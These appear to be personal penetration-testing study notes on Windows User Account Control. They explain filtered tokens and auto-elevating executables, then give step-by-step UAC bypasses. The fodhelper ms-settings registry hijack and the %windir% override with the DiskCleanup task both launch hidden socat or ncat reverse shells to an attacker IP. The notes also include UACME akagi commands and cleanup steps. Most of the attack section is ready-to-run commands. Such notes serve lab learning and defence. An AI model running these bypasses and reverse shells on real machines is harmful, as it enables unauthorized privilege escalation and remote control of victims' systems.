| Feature              | UAC                                                      | ACL                                             |
| -------------------- | -------------------------------------------------------- | ----------------------------------------------- |
| **Stands for**       | User Account Control                                     | Access Control List                             |
| **Controls**         | Whether a user can elevate privileges                    | Who can access/modify a specific object         |
| **Applies to**       | Processes, applications, system changes                  | Files, folders, registry, AD objects, etc.      |
| **User Interaction** | Prompts user when elevation is needed                    | Silent enforcement (no prompts)                 |
| **Security Focus**   | Protecting system from unauthorized privilege escalation | Defining per-user/per-group access rights       |
| **Main Benefit**     | Reduces risk of malware or accidental system changes     | Fine-grained access control to system resources |
| **Scope**            | Locally                                                  | Entire domain                                   |


---
# UAC

## Enumerate 
```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
```
## What are filtered tokens?
To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:

Non-administrators will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL (integrity level).
Administrators will receive two access tokens:
1. Filtered Token: A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.
 2. Elevated Token: A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.
![[Pasted image 20251011155359.png]]


## UAC in a nutshell
At the heart of UAC, we have the Application Information Service or Appinfo. Whenever a user requires elevation, the following occurs:

1. The user requests to run an application as administrator.
2. A `ShellExecute` API call is made using the `runas` verb.
3. The request gets forwarded to `Appinfo` to handle elevation.
4. The application manifest is checked to see if `AutoElevation` is allowed (more on this later).
5. `Appinfo` executes consent.exe, which shows the UAC prompt on a secure desktop. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.
6. If the user gives consent to run the application as administrator, the `Appinfo` service will execute the request using a user's Elevated Token. `Appinfo` will then set the parent process ID of the new process to point to the shell from which elevation was requested.
![[Pasted image 20251011155133.png]]


## Techniques to get a high IL from a medium IL session

# 1. GUI - `msfconfig`
If we analyze the `msconfig` process with Process Hacker, we notice something interesting. Even when no UAC prompt was presented to us, `msconfig` runs as a high IL process:
![[Pasted image 20251011160623.png]]
>This called auto elevating

## 2. AutoElevate
As mentioned before, some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows.

For an application, some requirements need to be met to auto-elevate:
1. The executable must be signed by the Windows Publisher
2. The executable must be contained in a trusted directory, like `%SystemRoot%``/System32/` or `%ProgramFiles%/`


Executable files (.exe) must declare the autoElevate element inside their manifests. To check a file's manifest, we can use sigcheck, a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on C:\tools\ . If we check the manifest for msconfig.exe, we will find the autoElevate property:

Command Prompt

```powershell
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>

```

### Fodhelper.exe
Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, unlike `msconfig`, `fodhelper` ***can be abused without having access to a GUI.***
From an attacker's perspective, this means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process.
> *This technique has been used in the wild by the Glupteba malware.*


What was noticed about fodhelper is that it searches the registry for a specific key of interest:
![[Pasted image 20251011183014.png]]


When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (ProgID) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the HKEY_CLASSES_ROOT will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the `shell/open/command` subkey for each file's ProgID. Taking the "`htmlfile`" ProgID as an example:
![[Pasted image 20251011183037.png]]

Going back to fodhelper, we now see that it's trying to open a file under the ms-settings ProgID. By creating an association for that ProgID in the current user's context under HKCU, we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.

the attack goes like this:
```powershell
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.

# finally trigger fodhelper.exe
C:\> fodhelper.exe


# Cleanup with:
reg delete HKCU\Software\Classes\ms-settings\ /f
```

## Expanding variables
overwriting `%windir%` variable and add schedule task

Luckily for us, we can override the %windir% variable through the registry by creating an entry in HKCU\Environment. If we want to execute a reverse shell using socat, we can set %windir%  as follows (without the quotes):

```powershell
"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "
```

At the end of our command, we concatenate "&REM " (ending with a blank space) to comment whatever is put after %windir% when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):

```powershell
cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```
Where anything after the "REM" is ignored as a comment.


And finally, run the following commands to write our payload to %windir% and then execute the DiskCleanup task:
```powershell
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
# or
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c set CMD="powershell -windowstyle hidden C:\tools\nmap\ncat.exe 192.168.100.131 4444 -e cmd.exe",pipes &REM " /f # check the syntax

```

cleanup:
```powershell
reg delete "HKCU\Environment" /v "windir" /f
```

---
# Automated using https://github.com/hfiref0x/UACME
located in tools
syntax:
```powershell
akagi32.exe 23
akagi64.exe 61
akagi32.exe 23 c:\windows\system32\calc.exe
akagi64.exe 61 c:\windows\system32\charmap.exe
akagi64.exe 33 cmd.exe # the most stable one


    Method 30, 63 and later are implemented only in x64 version
    Method 30 requires x64 because it exploits WOW64 subsystem feature
    Method 55 is included primarily for educational purposes and may not be reliable
    Method 78 requires that the current user account password is not blank

```
